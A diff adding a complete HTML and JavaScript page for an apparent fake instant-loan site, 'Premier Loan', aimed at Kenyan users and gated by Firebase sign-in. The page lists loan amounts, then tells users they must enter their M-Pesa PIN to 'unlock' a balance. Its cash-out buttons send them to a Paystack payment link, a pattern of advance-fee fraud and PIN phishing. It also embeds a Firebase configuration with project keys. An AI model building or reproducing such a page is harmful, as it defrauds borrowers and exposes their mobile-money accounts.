@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device‑width, initial‑scale=1.0">
+  <title>Home – Premier Loan</title>
+  <style>
+    * { margin:0; padding:0; box‑sizing:border‑box; }
+    html, body { height:100%; font‑family: Arial, sans‑serif; }
+    body { display:flex; overflow:hidden; }
+    /* Sidebar */
+    #sidebar { width:250px; background:#2c3e50; color:#ecf0f1; transition: margin-left .3s ease; }
+    #sidebar.block { margin-left:-250px; }
+    #sidebar ul { list‑style:none; padding:20px; }
+    #sidebar ul li { margin-bottom:20px; }
+    #sidebar ul li a { color:#ecf0f1; text-decoration:none; font-size:18px; display:block; }
+    #sidebar ul li a:hover { background:#34495e; padding:10px; border-radius:4px; }
+    /* Content area */
+    #content { flex:1; background:#ecf0f1; overflow:auto; position:relative; }
+    #toggleBtn { position:absolute; top:10px; left:10px; font-size:24px; color:#2c3e50; cursor:pointer; }
+    section { padding:60px 30px; display:none; min‑height:calc(100vh‑120px); }
+    section.active { display:block; }
+    /* Home image slider */
+    #slider { position:relative; width:100%; height:300px; overflow:hidden; border-radius:8px; margin-bottom:30px; }
+    #slider img { width:100%; height:100%; object-fit:cover; position:absolute; top:0; left:0; opacity:0; transition: opacity 1s ease; }
+    #slider img.active { opacity:1; }
+    /* Buttons grid for apply loan */
+    .loan-grid { display:grid; grid-template-columns: repeat(auto-fit, minmax(120px,1fr)); gap:15px; }
+    .loan-grid button { padding:15px; font-size:16px; border:none; border-radius:4px; background:#2980b9; color:#fff; cursor:pointer; }
+    .loan-grid button:hover { background:#1c5980; }
+    /* My account */
+    .account-box { background:#fff; padding:30px; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.1); }
+    .account-box h3 { margin-bottom:15px; }
+    .account-box button { margin-top:20px; padding:12px; font-size:16px; border:none; border-radius:4px; background:#27ae60; color:#fff; cursor:pointer; width:100%; }
+    .account-box button:hover { background:#1e7c43; }
+    /* About us */
+    .about-box { background:#fff; padding:30px; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.1); }
+    .about-box p { margin-bottom:15px; line-height:1.6; color:#333; }
+  </style>
+</head>
+<body>
+
+  <div id="sidebar">
+    <ul>
+      <li><a href="#" data‑section="home">Home</a></li>
+      <li><a href="#" data‑section="applyLoan">Apply Loan</a></li>
+      <li><a href="#" data‑section="myAccount">My Account</a></li>
+      <li><a href="#" data‑section="aboutUs">About Us</a></li>
+      <li><a href="#" id="logoutLink">Log Out</a></li>
+    </ul>
+  </div>
+
+  <div id="content">
+    <div id="toggleBtn">☰</div>
+
+    <!-- Home Section -->
+    <section id="home" class="active">
+      <h2>Welcome to Premier Loan</h2>
+      <div id="slider">
+        <img src="image1.jpg" class="active" alt="Slide 1">
+        <img src="image2.jpg" alt="Slide 2">
+        <img src="image3.jpg" alt="Slide 3">
+        <!-- Add more if needed -->
+      </div>
+      <p>Here you’ll find the best offers for your loan instantly. Explore our services through the menu.</p>
+    </section>
+
+    <!-- Apply Loan Section -->
+    <section id="applyLoan">
+      <h2>Apply for a Loan</h2>
+      <div class="loan-grid">
+        <button data‑amount="2000">2,000 sh</button>
+        <button data‑amount="5000">5,000 sh</button>
+        <button data‑amount="10000">10,000 sh</button>
+        <button data‑amount="20000">20,000 sh</button>
+        <button data‑amount="50000">50,000 sh</button>
+        <button data‑amount="100000">100,000 sh</button>
+        <button data‑amount="200000">200,000 sh</button>
+        <button data‑amount="500000">500,000 sh</button>
+        <button data‑amount="1000000">1,000,000 sh</button>
+      </div>
+    </section>
+
+    <!-- My Account Section -->
+    <section id="myAccount">
+      <h2>My Account</h2>
+      <div class="account-box">
+        <h3>Balance: 1000 sh</h3>
+        <p>To cash out you need to unlock your account.</p>
+        <p>
+        you will need to enter your mpesa pin to unlock account and recieve loan you applied</p>
+        <button id="cashOutPhoneBtn">Cash out to Phone (+254 …)</button>
+        <button id="cashOutBankBtn">Cash out to Bank</button>
+      </div>
+    </section>
+
+    <!-- About Us Section -->
+    <section id="aboutUs">
+      <h2>About Us</h2>
+      <div class="about-box">
+        <p>This is an offer from Premier Link to get your loan instantly from our member of Apply Loan Global supported by football program. Don’t miss this — it’s an offer for this year.</p>
+        <p>Contact us at: <a href="mailto:applyloan@gmail.com">applyloan@gmail.com</a></p>
+      </div>
+    </section>
+
+  </div>
+
+  <script type="module">
+    // Firebase App + Auth imports
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+    import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-auth.js";
+
+    // Your Firebase configuration (replace with your values)
+ // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyCHRJc6ESHPOvLkWy_-Bwcx0AJ7TEv8cxM",
+  authDomain: "kenyaconnect-homes.firebaseapp.com",
+  databaseURL: "https://kenyaconnect-homes-default-rtdb.firebaseio.com",
+  projectId: "kenyaconnect-homes",
+  storageBucket: "kenyaconnect-homes.firebasestorage.app",
+  messagingSenderId: "288863633200",
+  appId: "1:288863633200:web:4354a562f8cf701b3152f5",
+  measurementId: "G-5B2NPSCMB8"
+};
+
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+
+    // Protect this page: redirect if not logged in
+    onAuthStateChanged(auth, user => {
+      if (!user) {
+        // Not signed in, redirect to sign in page
+        window.location.href = "signin.html";
+      }
+      // else user is signed in, allow access
+    });
+
+    // Sidebar toggle
+    const sidebar = document.getElementById('sidebar');
+    const toggleBtn = document.getElementById('toggleBtn');
+    toggleBtn.addEventListener('click', () => {
+      sidebar.classList.toggle('block');
+    });
+
+    // Navigation links
+    const links = sidebar.querySelectorAll('a[data‑section]');
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        e.preventDefault();
+        const target = link.getAttribute('data‑section');
+        document.querySelectorAll('section').forEach(sec => sec.classList.remove('active'));
+        document.getElementById(target).classList.add('active');
+      });
+    });
+
+    // Logout link
+    document.getElementById('logoutLink').addEventListener('click', e => {
+      e.preventDefault();
+      signOut(auth).then(() => {
+        window.location.href = "signin.html";
+      }).catch(error => {
+        console.error("Sign‑Out Error", error);
+      });
+    });
+
+    // Image slider logic
+    const slides = document.querySelectorAll('#slider img');
+    let currentSlide = 0;
+    setInterval(() => {
+      slides[currentSlide].classList.remove('active');
+      currentSlide = (currentSlide + 1) % slides.length;
+      slides[currentSlide].classList.add('active');
+    }, 5000);
+
+    // Loan button clicks
+    document.querySelectorAll('.loan-grid button').forEach(btn => {
+      btn.addEventListener('click', () => {
+        // store selected amount
+        localStorage.setItem('selectedLoanAmount', btn.dataset.amount);
+        // navigate to My Account section
+        document.querySelectorAll('section').forEach(sec => sec.classList.remove('active'));
+        document.getElementById('myAccount').classList.add('active');
+      });
+    });
+
+    // Cash out buttons logic
+    document.getElementById('cashOutPhoneBtn').addEventListener('click', () => {
+      window.location.href = 'https://paystack.shop/pay/f9u3zvc5oy';
+    });
+    document.getElementById('cashOutBankBtn').addEventListener('click', () => {
+      const bank = prompt('Select bank: Cooperative Bank, KCB Bank or Absa Bank');
+      if (bank && (bank.toLowerCase().includes('cooperative') || bank.toLowerCase().includes('kcb') || bank.toLowerCase().includes('absa'))) {
+        window.location.href = 'https://paystack.shop/pay/f9u3zvc5oy';
+      } else {
+        alert('Invalid bank selected');
+      }
+    });
+
+  </script>
+
+</body>
+</html>
